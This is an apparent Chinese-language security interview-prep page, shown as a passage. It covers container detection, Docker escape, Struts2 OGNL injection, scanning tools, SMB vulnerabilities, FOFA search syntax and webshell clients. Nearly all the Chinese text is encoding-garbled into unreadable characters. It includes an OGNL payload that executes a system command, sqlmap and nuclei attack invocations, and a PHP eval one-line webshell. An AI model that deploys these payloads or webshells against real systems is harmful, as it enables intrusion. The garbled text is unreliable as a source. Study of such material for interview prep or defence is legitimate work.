‡è¯†ã€‚</li><li><strong>åˆ©ç”¨cgroupä¿¡æ¯çš„å·®å¼‚</strong>ï¼šé€šè¿‡æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹çš„cgroupä¿¡æ¯ï¼Œå¯ä»¥è¯†åˆ«å½“å‰è¿›ç¨‹æ‰€å¤„çš„è¿è¡Œç¯å¢ƒã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure></li><li><strong>æ£€æŸ¥æ ¹ç›®å½•ä¸‹çš„<code>.dockerenv</code>æ–‡ä»¶</strong>ï¼šå¦‚æœå­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯´æ˜å½“å‰ç¯å¢ƒæ˜¯Dockerå®¹å™¨ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv</span><br></pre></td></tr></table></figure></li><li><strong>æ£€æŸ¥æŒ‚è½½ä¿¡æ¯</strong>ï¼šé€šè¿‡æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯ï¼Œå¯ä»¥æ¨æµ‹å½“å‰æ‰€å¤„çš„ç¯å¢ƒã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure></li></ul><h3 id="äº‘åŸç”Ÿæ”»é˜²æ€è·¯ä»¥åŠæ‰‹æ®µ"><a href="#äº‘åŸç”Ÿæ”»é˜²æ€è·¯ä»¥åŠæ‰‹æ®µ" class="headerlink" title="äº‘åŸç”Ÿæ”»é˜²æ€è·¯ä»¥åŠæ‰‹æ®µ"></a>äº‘åŸç”Ÿæ”»é˜²æ€è·¯ä»¥åŠæ‰‹æ®µ</h3><h4 id="æ”»é˜²æ€è·¯"><a href="#æ”»é˜²æ€è·¯" class="headerlink" title="æ”»é˜²æ€è·¯"></a>æ”»é˜²æ€è·¯</h4><ol><li><strong>çªç ´ç½‘ç»œéš”ç¦»</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨äº‘åŸç”Ÿç¯å¢ƒä¸­çš„ç½‘ç»œé…ç½®æ¼æ´ï¼Œå¦‚VPCã€å®‰å…¨ç»„ç­‰ï¼Œçªç ´ç½‘ç»œéš”ç¦»ã€‚</li><li><strong>çªç ´èµ„æºéš”ç¦»</strong>ï¼šé€šè¿‡å®¹å™¨é€ƒé€¸ã€è™šæ‹Ÿæœºé€ƒé€¸ç­‰æ‰‹æ®µï¼Œçªç ´èµ„æºéš”ç¦»ã€‚</li><li><strong>çªç ´æƒé™éš”ç¦»</strong>ï¼šåˆ©ç”¨äº‘åŸç”Ÿç¯å¢ƒä¸­çš„æƒé™ç®¡ç†æ¼æ´ï¼Œå¦‚IAMè´¦å·ã€ç­–ç•¥ç­‰ï¼Œæå‡æƒé™ã€‚</li><li><strong>çªç ´æ¶æ„éš”ç¦»</strong>ï¼šé’ˆå¯¹å¤šç§Ÿæˆ·ç¯å¢ƒï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨é€»è¾‘å¤šç§Ÿçš„æ¼æ´ï¼Œçªç ´æ¶æ„éš”ç¦»ã€‚</li></ol><h4 id="å¸¸è§æ”»å‡»æ‰‹æ®µ"><a href="#å¸¸è§æ”»å‡»æ‰‹æ®µ" class="headerlink" title="å¸¸è§æ”»å‡»æ‰‹æ®µ"></a>å¸¸è§æ”»å‡»æ‰‹æ®µ</h4><ul><li><strong>å®¹å™¨é€ƒé€¸</strong>ï¼šåˆ©ç”¨å®¹å™¨è¿è¡Œæ—¶çš„æ¼æ´ï¼Œä»å®¹å™¨é€ƒé€¸åˆ°å®¿ä¸»æœºã€‚</li><li><strong>Kubernetesé›†ç¾¤æ”»å‡»</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨Kubernetesé›†ç¾¤ä¸­çš„æœªæˆæƒè®¿é—®ã€API Serveræ¼æ´ç­‰ï¼Œæ§åˆ¶æ•´ä¸ªé›†ç¾¤ã€‚</li><li><strong>äº‘å­˜å‚¨æ”»å‡»</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨äº‘å­˜å‚¨æœåŠ¡çš„æ¼æ´ï¼Œå¦‚Bucketå…¬å¼€è®¿é—®ã€æƒé™é…ç½®ä¸å½“ç­‰ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚</li></ul><h3 id="Dockeré€ƒé€¸çš„æ‰‹æ®µ"><a href="#Dockeré€ƒé€¸çš„æ‰‹æ®µ" class="headerlink" title="Dockeré€ƒé€¸çš„æ‰‹æ®µ"></a>Dockeré€ƒé€¸çš„æ‰‹æ®µ</h3><h4 id="1-åˆ©ç”¨å†…æ ¸æ¼æ´"><a href="#1-åˆ©ç”¨å†…æ ¸æ¼æ´" class="headerlink" title="1. åˆ©ç”¨å†…æ ¸æ¼æ´"></a>1. åˆ©ç”¨å†…æ ¸æ¼æ´</h4><ul><li><strong>åŸç†</strong>ï¼šDockerå®¹å™¨ä¾èµ–äºå®¿ä¸»æœºçš„å†…æ ¸ï¼Œå¦‚æœå†…æ ¸å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ä»å®¹å™¨é€ƒé€¸åˆ°å®¿ä¸»æœºã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼šåˆ©ç”¨å·²çŸ¥çš„å†…æ ¸æ¼æ´ï¼ˆå¦‚Dirty COWï¼‰è¿›è¡Œé€ƒé€¸ã€‚</li></ul><h4 id="2-åˆ©ç”¨Dockerç‰ˆæœ¬æ¼æ´"><a href="#2-åˆ©ç”¨Dockerç‰ˆæœ¬æ¼æ´" class="headerlink" title="2. åˆ©ç”¨Dockerç‰ˆæœ¬æ¼æ´"></a>2. åˆ©ç”¨Dockerç‰ˆæœ¬æ¼æ´</h4><ul><li><strong>åŸç†</strong>ï¼šæŸäº›Dockerç‰ˆæœ¬å¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´è¿›è¡Œé€ƒé€¸ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼šåˆ©ç”¨Dockerç‰¹å®šç‰ˆæœ¬çš„æ¼æ´ï¼Œå¦‚<code>docker escape</code>æ¼æ´ã€‚</li></ul><h4 id="3-åˆ©ç”¨CDKè‡ªåŠ¨åŒ–å·¥å…·"><a href="#3-åˆ©ç”¨CDKè‡ªåŠ¨åŒ–å·¥å…·" class="headerlink" title="3. åˆ©ç”¨CDKè‡ªåŠ¨åŒ–å·¥å…·"></a>3. åˆ©ç”¨CDKè‡ªåŠ¨åŒ–å·¥å…·</h4><ul><li><strong>åŸç†</strong>ï¼šé€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¦‚CDKï¼‰è¿›è¡Œå®¹å™¨éƒ¨ç½²æ—¶ï¼Œå¯èƒ½å­˜åœ¨é…ç½®ä¸å½“æˆ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›è¿›è¡Œé€ƒé€¸ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼šé€šè¿‡åˆ†æCDKç”Ÿæˆçš„é…ç½®æ–‡ä»¶ï¼Œå¯»æ‰¾æ½œåœ¨çš„æ¼æ´åˆ©ç”¨ç‚¹ã€‚</li></ul><h4 id="4-åˆ©ç”¨æŒ‚è½½ç‚¹"><a href="#4-åˆ©ç”¨æŒ‚è½½ç‚¹" class="headerlink" title="4. åˆ©ç”¨æŒ‚è½½ç‚¹"></a>4. åˆ©ç”¨æŒ‚è½½ç‚¹</h4><ul><li><strong>åŸç†</strong>ï¼šå¦‚æœå®¹å™¨æŒ‚è½½äº†å®¿ä¸»æœºçš„æ•æ„Ÿç›®å½•ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹å®¿ä¸»æœºä¸Šçš„æ–‡ä»¶æˆ–é…ç½®ï¼Œä»è€Œå®ç°é€ƒé€¸ã€‚</li><li><strong>æ“ä½œç¤ºä¾‹</strong>ï¼šé€šè¿‡æŒ‚è½½ç‚¹ä¿®æ”¹å®¿ä¸»æœºä¸Šçš„å…³é”®æ–‡ä»¶ã€‚</li></ul><h3 id="Struts2-OGNL-æ³¨å…¥æ¼æ´ï¼š"><a href="#Struts2-OGNL-æ³¨å…¥æ¼æ´ï¼š" class="headerlink" title="Struts2 OGNL æ³¨å…¥æ¼æ´ï¼š"></a><strong>Struts2 OGNL æ³¨å…¥æ¼æ´</strong>ï¼š</h3><p><strong>Struts2 OGNL æ³¨å…¥æ¼æ´</strong>æ˜¯ç”±äºæ¡†æ¶åœ¨å¤„ç†ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰å¯¹ OGNL è¡¨è¾¾å¼ï¼ˆObject-Graph Navigation Languageï¼‰åšä¸¥æ ¼çš„è¾“å…¥æ ¡éªŒï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„è¡¨è¾¾å¼ï¼Œåœ¨æœåŠ¡ç«¯è¢«å½“ä½œä»£ç æ‰§è¡Œï¼Œä»è€Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚</p><p>æœ¬è´¨ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ª<strong>è¡¨è¾¾å¼æ³¨å…¥</strong>é—®é¢˜ï¼Œå…³é”®åŸå› åœ¨äºï¼š</p><ul><li>Struts2 åœ¨ä¸€äº›æ ‡ç­¾ï¼ˆå¦‚ <code>%&#123;&#125;</code>ï¼‰ã€å‚æ•°ç»‘å®šã€é”™è¯¯ä¿¡æ¯å›æ˜¾ä¸­<strong>è‡ªåŠ¨æ‰§è¡Œäº† OGNL è¡¨è¾¾å¼</strong>ã€‚</li><li>ç”¨æˆ·è¾“å…¥æœªç»å®‰å…¨å¤„ç†å°±è¢«å¸¦å…¥ OGNL æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ å¦‚ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>, #cmd=<span class="string">&#x27;whoami&#x27;</span>, <span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(#cmd)&#125;</span><br></pre></td></tr></table></figure></li><li>å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</li></ul><p>å¸¸è§æ¼æ´ç¼–å·å¦‚ï¼š</p><ul><li>CVE-2017-5638ï¼ˆS2-045ï¼ŒContent-Type å¤´ä¸­çš„ OGNLï¼‰</li><li>CVE-2018-11776ï¼ˆURL è·¯ç”±å‚æ•°æœªæ ¡éªŒï¼‰</li></ul><p>å½“ç„¶å¯ä»¥ï¼ä¸‹é¢æ˜¯<strong>ç½‘ç»œå®‰å…¨é¢è¯•ä¸­å¸¸é—®çš„å¸¸è§æ‰«æå·¥å…·åŠå…¶ç”¨æ³•æ€»ç»“</strong>ï¼Œæ¶µç›–ç«¯å£æ‰«æã€æ¼æ´æ‰«æã€ç›®å½•æ‰«æã€èµ„äº§ä¿¡æ¯æ¢æµ‹ç­‰å¤šä¸ªç»´åº¦ï¼Œæ–¹ä¾¿ä½ é¢è¯•æ—¶ç³»ç»Ÿä½œç­”ã€‚</p><h3 id="å¸¸è§æ”»å‡»æ‰«æå‘½ä»¤"><a href="#å¸¸è§æ”»å‡»æ‰«æå‘½ä»¤" class="headerlink" title="å¸¸è§æ”»å‡»æ‰«æå‘½ä»¤"></a>å¸¸è§æ”»å‡»æ‰«æå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p- 192.168.1.1      <span class="comment"># å…¨ç«¯å£ TCP æ‰«æ</span></span><br><span class="line">nmap -sV 192.168.1.1              <span class="comment"># è¯†åˆ«æœåŠ¡ç‰ˆæœ¬</span></span><br><span class="line">nmap -A 192.168.1.1               <span class="comment"># å¼€å¯æ“ä½œç³»ç»Ÿè¯†åˆ«ã€ç‰ˆæœ¬ã€è„šæœ¬</span></span><br><span class="line">nmap -sU -p 53 192.168.1.1        <span class="comment"># UDP ç«¯å£æ‰«æ</span></span><br><span class="line">nmap --script vuln target.com     <span class="comment"># ä½¿ç”¨ NSE æ¼æ´è„šæœ¬æ‰«æ</span></span><br><span class="line"></span><br><span class="line">masscan -p1-65535 192.168.1.0/24 --rate=10000</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u http://target.com -e php,asp,html -w wordlist.txt</span><br><span class="line"></span><br><span class="line">nuclei -u http://target.com -t cves/ -severity critical</span><br><span class="line">nuclei -list targets.txt -tags rce,xss</span><br><span class="line"></span><br><span class="line">**WhatWeb / Wappalyzer / Webanalyze** â€“ Web æŒ‡çº¹è¯†åˆ«</span><br><span class="line">whatweb http://target.com</span><br><span class="line"></span><br><span class="line">xray webscan --url http://target.com --plugins xss,sqli,xxe --html-output report.html</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap --batch --cookie=<span class="string">&quot;sessionid=...&quot;</span> --risk=3 --level=5</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯æœ‰å…³SMBæœåŠ¡çš„å¸¸è§é¢è¯•é—®é¢˜ï¼ŒæŒ‰ç…§ä¸åŒç±»åˆ«è¿›è¡Œæ•´ç†ï¼š</p><h3 id="SMBæœåŠ¡åŸºç¡€æ¦‚å¿µç±»é—®é¢˜"><a href="#SMBæœåŠ¡åŸºç¡€æ¦‚å¿µç±»é—®é¢˜" class="headerlink" title="SMBæœåŠ¡åŸºç¡€æ¦‚å¿µç±»é—®é¢˜"></a>SMBæœåŠ¡åŸºç¡€æ¦‚å¿µç±»é—®é¢˜</h3><ol><li><p><strong>ä»€ä¹ˆæ˜¯SMBæœåŠ¡ï¼Ÿå®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>SMBï¼ˆServer Message Blockï¼‰æœåŠ¡æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œä¸»è¦ç”¨äºåœ¨è®¡ç®—æœºä¹‹é—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºå’Œå…¶ä»–èµ„æºã€‚å®ƒå…è®¸å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºè®¿é—®æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å’Œç›®å½•ï¼Œå°±åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸€æ ·ã€‚</li></ul></li><li><p><strong>SMBæœåŠ¡ä½¿ç”¨å“ªäº›ç«¯å£è¿›è¡Œé€šä¿¡ï¼Ÿ</strong></p><ul><li>SMBæœåŠ¡é€šå¸¸ä½¿ç”¨TCPç«¯å£139å’Œ445è¿›è¡Œé€šä¿¡ã€‚ç«¯å£139ä½¿ç”¨NetBIOSä¼šè¯æœåŠ¡ï¼Œè€Œç«¯å£445åˆ™æ˜¯ç›´æ¥ä½¿ç”¨TCP&#x2F;IPï¼Œä¸ä¾èµ–äºNetBIOSã€‚</li></ul></li><li><p><strong>SMBåè®®æœ‰å“ªäº›ç‰ˆæœ¬ï¼Ÿå®ƒä»¬ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><ul><li>SMBåè®®æœ‰å¤šä¸ªç‰ˆæœ¬ï¼Œå¦‚SMB1.0ã€SMB2.0ã€SMB2.1ã€SMB3.0ç­‰ã€‚SMB2.0åŠä»¥ä¸Šç‰ˆæœ¬åœ¨æ€§èƒ½ã€å®‰å…¨æ€§ç­‰æ–¹é¢æœ‰è¾ƒå¤§æ”¹è¿›ï¼Œä¾‹å¦‚SMB2.0å‡å°‘äº†å¾€è¿”æ¬¡æ•°ï¼Œæé«˜äº†ä¼ è¾“æ•ˆç‡ï¼ŒSMB3.0å¢åŠ äº†æ•°æ®åŠ å¯†ç­‰åŠŸèƒ½ã€‚</li></ul></li></ol><h3 id="SMBæœåŠ¡å®‰å…¨æ¼æ´ç±»é—®é¢˜"><a href="#SMBæœåŠ¡å®‰å…¨æ¼æ´ç±»é—®é¢˜" class="headerlink" title="SMBæœåŠ¡å®‰å…¨æ¼æ´ç±»é—®é¢˜"></a>SMBæœåŠ¡å®‰å…¨æ¼æ´ç±»é—®é¢˜</h3><ol><li><p><strong>SMBæœåŠ¡å­˜åœ¨å“ªäº›å®‰å…¨æ¼æ´ï¼Ÿ</strong></p><ul><li>SMBæœåŠ¡å­˜åœ¨å¤šç§å®‰å…¨æ¼æ´ï¼Œå¦‚â€œæ°¸æ’ä¹‹è“â€ï¼ˆEternalBlueï¼‰æ¼æ´ï¼Œå®ƒåˆ©ç”¨SMBv1åè®®çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ul></li><li><p><strong>å¦‚ä½•é˜²èŒƒSMBæœåŠ¡çš„å®‰å…¨æ¼æ´ï¼Ÿ</strong></p><ul><li>é˜²èŒƒSMBæœåŠ¡çš„å®‰å…¨æ¼æ´æªæ–½åŒ…æ‹¬ï¼šåŠæ—¶æ›´æ–°ç³»ç»Ÿå’ŒSMBæœåŠ¡çš„è¡¥ä¸ã€ç¦ç”¨ä¸å¿…è¦çš„SMBç‰ˆæœ¬ï¼ˆå¦‚SMBv1ï¼‰ã€é™åˆ¶å¯¹SMBæœåŠ¡çš„ç½‘ç»œè®¿é—®ã€ä½¿ç”¨é˜²ç«å¢™è§„åˆ™ç­‰ã€‚</li></ul></li><li><p><strong>å¦‚ä½•æ£€æµ‹å’Œä¿®å¤SMBæœåŠ¡çš„æ¼æ´ï¼Ÿ</strong></p><ul><li>å¯ä»¥ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·ï¼ˆå¦‚Nessusã€OpenVASç­‰ï¼‰æ¥æ£€æµ‹SMBæœåŠ¡çš„æ¼æ´ã€‚ä¿®å¤æ¼æ´é€šå¸¸éœ€è¦å®‰è£…ç›¸åº”çš„å®‰å…¨è¡¥ä¸ï¼Œæˆ–è€…æ ¹æ®æ¼æ´çš„å…·ä½“æƒ…å†µé‡‡å–ç›¸åº”çš„é…ç½®æ›´æ”¹ç­‰æªæ–½ã€‚</li></ul></li></ol><h3 id="Fofaè¯­æ³•"><a href="#Fofaè¯­æ³•" class="headerlink" title="Fofaè¯­æ³•"></a>Fofaè¯­æ³•</h3><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>ip</td><td>ip&#x3D;â€1.1.1.1â€</td><td>é€šè¿‡å•ä¸€IPv4åœ°å€è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr><tr><td>ip&#x3D;â€220.181.111.1&#x2F;24â€</td><td>é€šè¿‡IPv4 Cæ®µè¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td><td></td></tr><tr><td>port</td><td>port&#x3D;â€6379â€</td><td>é€šè¿‡ç«¯å£å·è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>domain</td><td>domain&#x3D;â€qq.comâ€</td><td>é€šè¿‡æ ¹åŸŸåè¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>server</td><td>server&#x3D;â€Microsoft-IIS&#x2F;10â€</td><td>é€šè¿‡æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>os</td><td>os&#x3D;â€centosâ€</td><td>é€šè¿‡æ“ä½œç³»ç»Ÿè¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr></tbody></table><p>æ ‡è®°ç±»</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>app</td><td>app&#x3D;â€Microsoft-Exchangeâ€</td><td>é€šè¿‡FOFAæ•´ç†çš„è§„åˆ™è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>-</td><td>-</td></tr><tr><td>product</td><td>product&#x3D;â€NGINXâ€</td><td>é€šè¿‡FOFAæ ‡è®°çš„äº§å“åè¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr><tr><td>type</td><td>type&#x3D;â€serviceâ€</td><td>ç­›é€‰åè®®èµ„äº§</td><td>âœ“</td><td>-</td><td>-</td></tr><tr><td>type&#x3D;â€subdomainâ€</td><td>ç­›é€‰æœåŠ¡ï¼ˆç½‘ç«™ç±»ï¼‰èµ„äº§</td><td>âœ“</td><td>-</td><td>-</td><td></td></tr><tr><td>cloud_name</td><td>cloud_name&#x3D;â€Aliyundunâ€</td><td>é€šè¿‡äº‘æœåŠ¡å•†è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr></tbody></table><p>åè®®ç±»ï¼ˆtype&#x3D;serviceï¼‰</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>protocol</td><td>protocol&#x3D;â€quicâ€</td><td>é€šè¿‡åè®®åç§°è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>banner</td><td>banner&#x3D;â€usersâ€</td><td>é€šè¿‡åè®®è¿”å›ä¿¡æ¯è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr></tbody></table><p>ç½‘ç«™ç±»ï¼ˆtype&#x3D;subdomainï¼‰</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>title</td><td>title&#x3D;â€beijingâ€</td><td>é€šè¿‡ç½‘ç«™æ ‡é¢˜è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>header</td><td>header&#x3D;â€elasticâ€</td><td>é€šè¿‡å“åº”æ ‡å¤´è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>body</td><td>body&#x3D;â€ç½‘ç»œç©ºé—´æµ‹ç»˜â€</td><td>é€šè¿‡HTMLæ­£æ–‡è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr></tbody></table><p>åœ°ç†ä½ç½®</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>country</td><td>country&#x3D;â€CNâ€</td><td>é€šè¿‡å›½å®¶çš„ç®€ç§°ä»£ç è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr><tr><td>region</td><td>region&#x3D;â€Zhejiangâ€</td><td>é€šè¿‡çœä»½&#x2F;åœ°åŒºè‹±æ–‡åç§°è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr><tr><td>city</td><td>city&#x3D;â€Hangzhouâ€</td><td>é€šè¿‡åŸå¸‚è‹±æ–‡åç§°è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>-</td></tr></tbody></table><p>è¯ä¹¦ç±»</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>cert</td><td>cert&#x3D;â€baiduâ€</td><td>é€šè¿‡è¯ä¹¦è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>cert.subject</td><td>cert.subject&#x3D;â€Oracle Corporationâ€</td><td>é€šè¿‡è¯ä¹¦çš„æŒæœ‰è€…è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr><tr><td>cert.issuer</td><td>cert.issuer&#x3D;â€DigiCertâ€</td><td>é€šè¿‡è¯ä¹¦çš„é¢å‘è€…è¿›è¡ŒæŸ¥è¯¢</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr></tbody></table><p>æ—¶é—´ç±»</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>after</td><td>after&#x3D;â€2023-01-01â€</td><td>ç­›é€‰æŸä¸€æ—¶é—´ä¹‹åæœ‰æ›´æ–°çš„èµ„äº§</td><td>âœ“</td><td>-</td><td>-</td></tr><tr><td>before</td><td>before&#x3D;â€2023-12-01â€</td><td>ç­›é€‰æŸä¸€æ—¶é—´ä¹‹å‰æœ‰æ›´æ–°çš„èµ„äº§</td><td>âœ“</td><td>-</td><td>-</td></tr></tbody></table><p>ç‹¬ç«‹IPè¯­æ³•</p><table><thead><tr><th>è¯­æ³•</th><th>ç¤ºä¾‹</th><th>ç”¨é€”è¯´æ˜</th><th>&#x3D;</th><th>!&#x3D;</th><th>*&#x3D;</th></tr></thead><tbody><tr><td>port_size</td><td>port_size&#x3D;â€6â€</td><td>ç­›é€‰å¼€æ”¾ç«¯å£æ•°é‡ç­‰äº6ä¸ªçš„ç‹¬ç«‹IP</td><td>âœ“</td><td>âœ“</td><td>-</td></tr><tr><td>ip_ports</td><td>ip_ports&#x3D;â€80,161â€</td><td>ç­›é€‰åŒæ—¶å¼€æ”¾ä¸åŒç«¯å£çš„ç‹¬ç«‹IP</td><td>âœ“</td><td>-</td><td>-</td></tr><tr><td>ip_country</td><td>ip_country&#x3D;â€CNâ€</td><td>é€šè¿‡å›½å®¶çš„ç®€ç§°ä»£ç è¿›è¡ŒæŸ¥è¯¢ç‹¬ç«‹IP</td><td>âœ“</td><td>-</td><td>-</td></tr></tbody></table><p>é€»è¾‘è¿æ¥ç¬¦</p><table><thead><tr><th>ç¬¦å·</th><th>å«ä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>&#x3D;</td><td>åŒ¹é…ï¼Œ&#x3D;â€â€æ—¶ï¼Œå¯æŸ¥è¯¢ä¸å­˜åœ¨å­—æ®µæˆ–è€…å€¼ä¸ºç©ºçš„æƒ…å†µ</td><td>ip&#x3D;â€1.1.1.1â€</td></tr><tr><td>&#x3D;&#x3D;</td><td>å®Œå…¨åŒ¹é…ï¼Œ&#x3D;&#x3D;â€â€æ—¶ï¼Œå¯æŸ¥è¯¢å­˜åœ¨ä¸”å€¼ä¸ºç©ºçš„æƒ…å†µ</td><td>-</td></tr><tr><td>&amp;&amp;</td><td>ä¸</td><td>ip&#x3D;â€1.1.1.1â€ &amp;&amp; port&#x3D;â€6379â€</td></tr><tr><td></td><td></td><td></td></tr><tr><td>!&#x3D;</td><td>ä¸åŒ¹é…ï¼Œ!&#x3D;â€â€æ—¶ï¼Œå¯æŸ¥è¯¢å€¼ä¸ä¸ºç©ºçš„æƒ…å†µ</td><td>port!&#x3D;â€6379â€</td></tr><tr><td>*&#x3D;</td><td>æ¨¡ç³ŠåŒ¹é…ï¼Œä½¿ç”¨*æˆ–è€…?è¿›è¡Œæœç´¢</td><td>banner*&#x3D;â€mys??â€</td></tr></tbody></table><h3 id="èœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰"><a href="#èœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰" class="headerlink" title="èœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰"></a>èœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰</h3><p><strong>èœåˆ€</strong><br>payloadç‰¹å¾ï¼š<br>PHP: <?php @eval($_POST['caidao']);?></p><p>ASP: &lt;%eval 